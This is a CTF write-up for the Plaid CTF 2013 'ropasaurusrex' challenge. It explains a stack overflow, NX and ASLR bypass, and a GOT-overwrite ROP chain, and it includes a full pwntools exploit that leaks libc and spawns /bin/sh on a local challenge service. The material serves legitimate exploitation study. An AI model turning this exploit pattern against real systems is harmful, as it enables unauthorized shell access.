---
title: 'Plaid CTF 2013 - ropasaurusrex Writeup'
date: 2013-04-01T00:00:00.000Z
excerpt: >-
  A classic Plaid CTF 2013 challenge: a ret2libc / ROP chain exploit against a 32-bit Linux binary.
tags:
  - ctf
  - writeup
  - pwn
  - plaid-ctf
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Overview

**ropasaurusrex** is a legendary Plaid CTF 2013 challenge that anyone studying ROP techniques ends up solving at some point. It's an excellent fit for learning the foundational concepts needed to bypass modern memory protections like NX and ASLR.

I'd previously done a very simple ROP challenge from Hackerschool during a study group, but this one holds special meaning for me since I solved it by referencing and studying multiple sources and grinding through it myself.

---

## Challenge analysis

### Binary basics

Running the file and typing anything prints the string "WIN" and exits.

![File information](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-2.png)

The binary is a **32-bit ELF executable**. Something I learned this time: when it's marked `stripped`, the main function's symbol is removed and doesn't show up directly in GDB.

Checking the protections with `checksec`:

![Binary protections - NX enabled](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-3.png)

**Key observations:**
- **NX bit**: enabled (stack/heap not executable)
- **ASLR**: enabled at the OS level (Ubuntu environment)
- **Stripped**: function names removed from the symbol table
- **Functions used**: only the `read()` and `write()` system calls

### Finding the vulnerability

A small amount of input runs normally:

![Small input - normal execution](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-0.png)

But a very large input causes a segmentation fault:

![Overflow input - segmentation fault](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-1.png)

Is this just a simple BOF challenge? Let's dig further.

### Reverse engineering

Analyzing the main function with IDA Pro's Hex-Rays decompiler:

![IDA analysis - main function](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-8.png)

The main function is simple. The core logic is inside `vuln_func()`:

![IDA analysis - vuln_func](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-9.png)

**The vulnerability:**
```c
char buffer[136];
read(0, buffer, 256);  // BOF: reading 256 bytes into a 136-byte buffer
```

The `read()` function reads **256 bytes** into a **136-byte** buffer, giving us **120 bytes** of overflow space.

### Direct assembly analysis

Looking at the actual assembly in the .text section:

![Assembly analysis - main and vuln_func](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-11.png)

The program's flow calls `write` right after `read`. The fact that only these two functions are used is the key point.

---

## Memory protections

### NX (No eXecute)

![NX explanation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-4.png)

NX is a memory protection that prevents a memory permission from simultaneously having write (w) and execute (x) permission.

For example, say there's a binary where an overflow occurs while reading input into a local variable. If NX is disabled, shellcode can be placed in that local variable's memory and executed by manipulating the return address. But if NX is enabled, that memory has no execute permission, so shellcode can't be run directly there. This forces reliance on existing code (ROP gadgets) instead.

### ASLR (Address Space Layout Randomization)

![ASLR explanation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-5.png)

A technique that randomizes the layout of address space to defend against memory-based attacks. It places data regions such as the stack, heap, and libraries (libc) at randomized addresses within the process's address space.

**Solution**: leak a libc address at runtime, then compute the offset between functions to reach a desired function such as `system()`.

---

## Exploit strategy

### Step 1: Gather key addresses

First, obtain the addresses we need:

```
read@plt:   0x804832c
read@got:   0x804961c
write@plt:  0x08048334
write@got:  0x08048624
pop3ret:    0x80484b6
.dynamic:   0x8049530
```

![Address collection](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-12.png)

### Step 2: Compute libc offsets

Run the binary under GDB to get the libc offsets:

![Libc offset calculation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-14.png)

Offsets within libc:
```
write offset:  0xe8090
system offset: 0x3e980
read offset:   0x99880
```

We use `write()` to leak the actual address of `write()` from the GOT, then compute the address of `system()` from it.

### Step 3: Find a ROP gadget

Find a gadget that matches the calling convention (cdecl: arguments on the stack, caller cleans up):

```
pop3ret (0x80484b6):  pop eax; pop eax; pop eax; ret
```

![pop3ret gadget](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-15.png)

This gadget's role is to move the stack pointer forward by the space of three function arguments.

### Step 4: Find a writable memory region

Find a location to store the "/bin/sh" string:

![Writable sections](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-13.png)

.data and .bss can only hold 8 bytes. So we'll store the "/bin/sh" string in the **.dynamic** region, located at `0x8049530`.

---

## Exploit implementation

### Solution logic

The exploit operates in three stages:

**Stage 1:** Leak a libc address
- Call `write(1, write@got, 4)` to leak the actual address of `write()` from the GOT
- `libc_base = leaked_write_address - write_offset`
- `system_address = libc_base + system_offset`

**Stage 2:** Write the command string
- Use `read(0, .dynamic, 8)` to read in "/bin/sh" and store it
- Use `read(0, read@got, 4)` to read in the address of `system()` and overwrite the GOT's read entry with it

**Stage 3:** Run system()
- The GOT's `read()` entry now points to `system()`
- Call `read()` with the address where "/bin/sh" is stored as the argument -> this actually runs `system("/bin/sh")`

### Python exploit code

```python
from pwn import *

r = remote('localhost', 6666)
e = ELF('./ropasaurusrex')

# gather information
write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']

pop3ret = 0x80484b6
cmd = '/bin/sh'
dynamic = 0x8049530
write_offset = 0xe8090
system_offset = 0x3e980

# build the ROP chain payload
payload = ''
payload += "A" * 140  # overflow up to the return address

# write(1, write@got, 4) - leak the libc address
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)           # fd = stdout
payload += p32(write_got)   # buffer = write@got
payload += p32(4)           # count = 4 bytes

# read(0, .dynamic, 8) - read the "/bin/sh" string
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)           # fd = stdin
payload += p32(dynamic)     # buffer = .dynamic section
payload += p32(8)           # count = 8 bytes

# read(0, read@got, 4) - overwrite read() with system()
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)           # fd = stdin
payload += p32(read_got)    # buffer = read@got
payload += p32(4)           # count = 4 bytes

# call the modified read() (which is now system())
payload += p32(read_plt)
payload += 'AAAA'           # return address (irrelevant)
payload += p32(dynamic)     # first argument: address of "/bin/sh"

# send the payload
r.send(payload)

# receive the leaked write() address
write_libc = u32(r.recv(4))
log.info("write_libc : %s" % hex(write_libc))

# compute addresses
libc_base = write_libc - write_offset
log.info("libc_base : %s" % hex(libc_base))

system_libc = libc_base + system_offset
log.info("system_libc : %s" % hex(system_libc))

# send the "/bin/sh" string
r.send(cmd)

# send the address of system()
r.send(p32(system_libc))

# get an interactive shell
r.interactive()
```

### Result

![Successful exploitation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-17.png)

The exploit successfully:
1. leaks the libc base address,
2. computes the address of the `system()` function,
3. overwrites `read()`'s GOT entry with `system()`, and
4. executes `/bin/sh`.

---

## Key concepts

### How ROP chains are built

A ROP (Return-Oriented Programming) chain works as follows:
1. Find short instruction sequences (gadgets) that end in `ret`
2. Place gadget addresses on the stack
3. Each `ret` jumps to the next gadget
4. Function arguments are placed on the stack (cdecl calling convention)

### GOT overwrite technique

Overwriting an entry in the GOT (Global Offset Table) can redirect a function call to an arbitrary address:
- The GOT is writable
- Function pointers are predictable
- Existing code paths can be reused

### Information leaks

ASLR randomizes library addresses, but it can be bypassed by:
- Reading memory through an output function like `write()`
- Precomputing offsets between functions within libc
- Working backward from a leaked function address to the base address

---

## References

- [BPSec Blog - Plaid CTF 2013 ropasaurusrex (1)](https://bpsecblog.wordpress.com/2016/03/12/pctf2013_ropasaurusrex/)
- [BPSec Blog - Plaid CTF 2013 ropasaurusrex (2)](https://bpsecblog.wordpress.com/2017/01/20/plaidctf-ropasaurusrex/)
- [BPSec Blog - GOT and PLT explained](https://bpsecblog.wordpress.com/2016/03/09/about_got_plt_2/)
- [Confus3r's writeup](http://confus3r.tistory.com/entry/Plaid-CTF-2013-ropasaurusrex)
